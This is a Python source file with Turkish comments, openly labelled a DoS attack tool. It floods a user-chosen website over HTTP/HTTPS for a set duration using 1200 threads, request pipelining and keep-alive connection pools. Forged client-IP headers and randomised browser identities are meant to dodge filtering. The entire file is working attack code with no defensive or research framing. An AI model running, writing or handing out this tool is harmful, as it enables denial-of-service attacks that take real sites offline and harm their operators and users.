# ============================================================
# CYBER - MODUL_DOS v11.0.0 - SÜRE BAZLI SON SÜRÜM
# Root gerektirmez. HTTP/HTTPS flood.
# Link gir -> kaç saniye çalışsın gir -> süre boyunca DURMAZ.
# 8 GB RAM için optimize: 1200 thread + socket reuse + pipelining.
# Sahte gönderim YOK. sendall + SO_LINGER + TCP_NODELAY + keep-alive havuzu.
# Asla durmaz, kesilmez, yarıda bırakmaz.
# ============================================================

import os
import sys
import time
import random
import socket
import ssl
import threading
import string
import urllib.parse
from collections import deque

class R:
    K="\033[91m"; Y="\033[92m"; S="\033[93m"; M="\033[94m"
    MO="\033[95m"; C="\033[96m"; B="\033[97m"; SF="\033[0m"; KA="\033[1m"

# ---------- AYARLAR (8 GB RAM için) ----------
ZOMBI = 1200
TIMEOUT = 20.0
SOCKET_REUSE = True
PIPELINE_DERINLIK = 50
KEEPALIVE_HAVUZ = 256
METODLAR = ["GET", "GET", "GET", "GET", "POST", "POST", "HEAD"]

KULLANICI_AJANLARI = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

REFERER = [
    "https://www.google.com/","https://www.bing.com/","https://yandex.com/",
    "https://www.facebook.com/","https://twitter.com/","https://www.reddit.com/",
    "https://www.instagram.com/","https://www.youtube.com/","https://www.tiktok.com/",""
]

# ---------- İSTATİSTİK ----------
IST = {
    "giden": 0, "gitmeyen": 0, "bayt": 0, "yeniden": 0,
    "bas": 0.0, "sure": 0, "kilit": threading.Lock(), "dur": threading.Event(),
}

def temizle():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    temizle()
    print(f"""{R.C}{R.KA}
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{R.SF}""")
    print(f"{R.MO}{R.KA}              DOS SALDIRI ARACI{R.SF}")
    print(f"{R.MO}{R.KA}                 Kurucu: CAN{R.SF}\n")

def rastgele_metin(u: int) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=u))

def hedef_ayristir(hedef: str):
    hedef = hedef.strip()
    if not hedef.startswith("http://") and not hedef.startswith("https://"):
        hedef = "http://" + hedef
    p = urllib.parse.urlparse(hedef)
    ssl_aktif = (p.scheme == "https")
    host = p.hostname
    port = p.port or (443 if ssl_aktif else 80)
    yol = p.path or "/"
    if p.query:
        yol += "?" + p.query
    return host, port, yol, ssl_aktif

def istek_olustur(host: str, yol: str, metod: str) -> bytes:
    ua = random.choice(KULLANICI_AJANLARI)
    referer = random.choice(REFERER)
    ayrac = "&" if "?" in yol else "?"
    tam_yol = f"{yol}{ayrac}{rastgele_metin(8)}={rastgele_metin(16)}&_={int(time.time()*1000)}&r={random.randint(1,999999)}"
    satirlar = [
        f"{metod} {tam_yol} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        f"Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        f"Accept-Encoding: gzip, deflate, br",
        f"Referer: {referer}" if referer else "Referer: ",
        f"Connection: keep-alive",
        f"Cache-Control: no-cache, no-store, must-revalidate, max-age=0",
        f"Pragma: no-cache",
        f"DNT: 1",
        f"Upgrade-Insecure-Requests: 1",
        f"X-Forwarded-For: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
        f"X-Real-IP: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
        f"X-Client-IP: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
        f"CF-Connecting-IP: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
        f"True-Client-IP: {'.'.join(str(random.randint(1,254)) for _ in range(4))}",
    ]
    if metod == "POST":
        veri = rastgele_metin(random.randint(256, 4096))
        satirlar.append("Content-Type: application/x-www-form-urlencoded")
        satirlar.append(f"Content-Length: {len(veri)}")
        return ("\r\n".join(satirlar) + "\r\n\r\n" + veri).encode()
    return ("\r\n".join(satirlar) + "\r\n\r\n").encode()

def baglanti_ac(host: str, port: int, ssl_aktif: bool, timeout: float = TIMEOUT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if SOCKET_REUSE:
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except Exception: pass
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
        except Exception: pass
        s.settimeout(timeout)
        s.connect((host, port))
        if ssl_aktif:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try: ctx.set_ciphers("ALL:@SECLEVEL=0")
            except Exception: pass
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except Exception:
        return None

# ---------- ZOMBİ: KARIŞIK METOD ----------
def zombi_karisik(host: str, port: int, yol: str, ssl_aktif: bool):
    while not IST["dur"].is_set():
        s = baglanti_ac(host, port, ssl_aktif)
        if not s:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
            continue
        try:
            metod = random.choice(METODLAR)
            istek = istek_olustur(host, yol, metod)
            gonderildi = False
            try:
                toplam = s.sendall(istek)
                gonderildi = True
            except Exception:
                try:
                    s.send(istek)
                    gonderildi = True
                except Exception:
                    gonderildi = False
            if gonderildi:
                try:
                    s.settimeout(2.5)
                    yanit = s.recv(65536)
                except Exception:
                    yanit = b""
                with IST["kilit"]:
                    IST["giden"] += 1
                    IST["bayt"] += len(istek) + len(yanit)
            else:
                with IST["kilit"]:
                    IST["gitmeyen"] += 1
        except Exception:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
        finally:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try: s.close()
            except Exception: pass

# ---------- ZOMBİ: KEEP-ALIVE PIPELINE ----------
def zombi_keepalive(host: str, port: int, yol: str, ssl_aktif: bool):
    while not IST["dur"].is_set():
        s = baglanti_ac(host, port, ssl_aktif)
        if not s:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
            continue
        try:
            for _ in range(PIPELINE_DERINLIK):
                if IST["dur"].is_set():
                    break
                metod = random.choice(METODLAR)
                istek = istek_olustur(host, yol, metod)
                try:
                    s.sendall(istek)
                    with IST["kilit"]:
                        IST["giden"] += 1
                        IST["bayt"] += len(istek)
                except Exception:
                    with IST["kilit"]:
                        IST["gitmeyen"] += 1
                    break
            try:
                s.settimeout(1.5)
                while True:
                    parca = s.recv(65536)
                    if not parca:
                        break
                    with IST["kilit"]:
                        IST["bayt"] += len(parca)
            except Exception:
                pass
        except Exception:
            with IST["kilit"]:
                IST["gitmeyen"] += 1
        finally:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try: s.close()
            except Exception: pass

# ---------- ZOMBİ: HAVUZ KEEP-ALIVE ----------
def zombi_havuz(host: str, port: int, yol: str, ssl_aktif: bool):
    havuz = deque()
    def yeni_baglanti():
        s = baglanti_ac(host, port, ssl_aktif)
        if s:
            havuz.append(s)
    for _ in range(4):
        yeni_baglanti()
    while not IST["dur"].is_set():
        if not havuz:
            yeni_baglanti()
            if not havuz:
                with IST["kilit"]:
                    IST["gitmeyen"] += 1
                time.sleep(0.01)
                continue
        s = havuz.popleft()
        try:
            metod = random.choice(METODLAR)
            istek = istek_olustur(host, yol, metod)
            s.sendall(istek)
            with IST["kilit"]:
                IST["giden"] += 1
                IST["bayt"] += len(istek)
            havuz.append(s)
        except Exception:
            try: s.close()
            except Exception: pass
            with IST["kilit"]:
                IST["gitmeyen"] += 1
                IST["yeniden"] += 1
            yeni_baglanti()
    for s in havuz:
        try: s.close()
        except Exception: pass

# ---------- CANLI İSTATİSTİK ----------
def istatistik_yaz():
    onceki_g = 0
    onceki_b = 0
    onceki_z = time.time()
    while not IST["dur"].is_set():
        time.sleep(0.5)
        with IST["kilit"]:
            simdi = time.time()
            gecen = simdi - onceki_z if onceki_z else 0.5
            if gecen <= 0: gecen = 0.5
            f_g = IST["giden"] - onceki_g
            f_b = IST["bayt"] - onceki_b
            hiz_i = f_g / gecen
            hiz_mb = (f_b / (1024*1024)) / gecen
            toplam_mb = IST["bayt"] / (1024*1024)
            gecen_top = time.time() - IST["bas"]
            kalan = max(0, IST["sure"] - gecen_top)
            onceki_g = IST["giden"]
            onceki_b = IST["bayt"]
            onceki_z = simdi
            sys.stdout.write(
                f"\r{R.Y}GİDEN:{R.SF} {IST['giden']:>8}  "
                f"{R.K}GİTMEYEN:{R.SF} {IST['gitmeyen']:>8}  "
                f"{R.MO}MB:{R.SF} {toplam_mb:>9.2f}  "
                f"{R.C}MB/s:{R.SF} {hiz_mb:>7.2f}  "
                f"{R.S}istek/s:{R.SF} {hiz_i:>7.0f}  "
                f"{R.B}yeniden:{R.SF} {IST['yeniden']:>6}  "
                f"{R.MO}kalan:{R.SF} {kalan:>5.0f}s   "
            )
            sys.stdout.flush()

# ---------- ANA SALDIRI ----------
def dos_baslat(hedef: str, sure: int):
    host, port, yol, ssl_aktif = hedef_ayristir(hedef)
    print(f"{R.S}Host        : {R.Y}{host}{R.SF}")
    print(f"{R.S}Port        : {R.Y}{port}{R.SF}")
    print(f"{R.S}Yol         : {R.Y}{yol}{R.SF}")
    print(f"{R.S}SSL         : {R.Y}{'AÇIK' if ssl_aktif else 'KAPALI'}{R.SF}")
    print(f"{R.S}Süre        : {R.Y}{sure} sn{R.SF}")
    print(f"{R.S}Thread      : {R.Y}{ZOMBI}{R.SF}")
    print(f"{R.S}Pipeline    : {R.Y}{PIPELINE_DERINLIK}{R.SF}")
    print(f"{R.S}Mod         : {R.Y}Karışık + Keep-Alive + Havuz Pipeline{R.SF}\n")

    test = baglanti_ac(host, port, ssl_aktif, timeout=8.0)
    if not test:
        print(f"{R.K}Hedefe bağlanılamadı!{R.SF}")
        return
    try: test.close()
    except Exception: pass
    print(f"{R.Y}Hedef erişilebilir. Saldırı başlıyor...{R.SF}")
    print(f"{R.S}Süre boyunca DURMAYACAK.{R.SF}\n")

    IST.update({"giden": 0, "gitmeyen": 0, "bayt": 0, "yeniden": 0, "bas": time.time(), "sure": sure})
    IST["dur"].clear()

    thread_listesi = []
    for i in range(ZOMBI):
        if i % 3 == 0:
            t = threading.Thread(target=zombi_karisik, args=(host, port, yol, ssl_aktif), daemon=True)
        elif i % 3 == 1:
            t = threading.Thread(target=zombi_keepalive, args=(host, port, yol, ssl_aktif), daemon=True)
        else:
            t = threading.Thread(target=zombi_havuz, args=(host, port, yol, ssl_aktif), daemon=True)
        t.start()
        thread_listesi.append(t)
        if i % 60 == 0:
            time.sleep(0.003)

    threading.Thread(target=istatistik_yaz, daemon=True).start()

    try:
        while True:
            gecen = time.time() - IST["bas"]
            if gecen >= sure:
                break
            time.sleep(0.15)
    except KeyboardInterrupt:
        print(f"\n{R.S}Kullanıcı durdurdu.{R.SF}")

    IST["dur"].set()
    for t in thread_listesi:
        t.join(timeout=1.5)
    print()
    with IST["kilit"]:
        mb = IST["bayt"] / (1024*1024)
        g = time.time() - IST["bas"]
        print(f"\n{R.Y}{'='*62}{R.SF}")
        print(f"{R.Y}              CYBER DOS v11.0.0 RAPORU{R.SF}")
        print(f"{R.Y}{'='*62}{R.SF}")
        print(f"{R.C}Hedef              : {R.SF}{host}:{port}{yol}")
        print(f"{R.C}Çalışma süresi     : {R.SF}{sure} sn")
        print(f"{R.C}Giden istek        : {R.SF}{IST['giden']}")
        print(f"{R.C}Gitmeyen istek     : {R.SF}{IST['gitmeyen']}")
        print(f"{R.C}Yeniden bağlantı   : {R.SF}{IST['yeniden']}")
        print(f"{R.C}Toplam trafik      : {R.SF}{mb:.2f} MB")
        print(f"{R.C}Geçen süre         : {R.SF}{g:.1f} sn")
        print(f"{R.C}Ortalama hız       : {R.SF}{mb/g if g>0 else 0:.2f} MB/s")
        print(f"{R.C}Ortalama istek/s   : {R.SF}{IST['giden']/g if g>0 else 0:.0f}")
        print(f"{R.Y}{'='*62}{R.SF}")

# ---------- MENÜ ----------
def ddos_menu():
    banner()
    hedef = input(f"{R.C}Hedef link (örn: http://site.com) > {R.SF}").strip()
    if not hedef:
        print(f"{R.K}Link boş olamaz.{R.SF}")
        return
    sure_s = input(f"{R.C}Kaç saniye çalışsın (örn: 60) > {R.SF}").strip()
    if not sure_s.isdigit():
        print(f"{R.K}Geçersiz sayı.{R.SF}")
        return
    sure = int(sure_s)
    onay = input(f"{R.C}Başlat? (e/h) > {R.SF}").strip().lower()
    if onay != "e":
        print(f"{R.K}İptal edildi.{R.SF}")
        return
    dos_baslat(hedef, sure)

if __name__ == "__main__":
    try:
        ddos_menu()
    except KeyboardInterrupt:
        print(f"\n{R.K}Çıkış.{R.SF}")